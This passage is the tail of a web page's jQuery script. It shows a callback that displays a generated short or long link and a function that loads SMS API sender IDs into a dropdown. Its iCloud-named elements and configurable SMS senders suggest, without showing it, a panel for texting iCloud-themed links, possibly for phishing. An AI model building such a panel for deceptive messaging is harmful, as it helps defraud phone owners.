         data: data_form,
         dataType: 'json',
         async: true,
          beforeSend: function() {                   
          $('#reloadIcloud').html('<img src="../public/assets/server/img/loading.gif" />');
          },
      }).done(function ajaxDone(res) {

         if(res['verify_link'] == 1){
            $('#reloadIcloud').html("");
            $("#linkgtrue").show();
            $("#linkgfalse").hide();
            $("#guardarequipo").attr('disabled','disabled')
         
         }else{
            $('#reloadIcloud').html("");
            $("#linkgtrue").hide();
            $("#linkgfalse").show();
            $("#guardarequipo").removeAttr('disabled');

              if(res['opcion_url'] == 'acortada'){

               $("#igeneratelink").val(res['link_short'])

              }else if(res['opcion_url'] == 'sinacortar'){
  
               $("#igeneratelink").val(res['link_long'])
             }
         }
        

         


      })

}

$("#id_apisms").on('change', function(){
  
   allsenderid($("#id_apisms").val())

})


function allsenderid(id_apisms){
      
     let data_form = {
         id_apisms : id_apisms
     } 

    $.ajax({
     
      url:"/configurar/smsapi/getsendersid",
      type:"POST",
      data:data_form,
      dataType: 'json',
      success:function(resp){
          $("#idsender").html('');
          $.each(resp, function(index, value){

             $("#idsender").append("<option value = "+value.idsender+">"+value.descripcion_cliente+"</option>")
          })        

      } 
    })  

   }
</script>
</body>
</html>
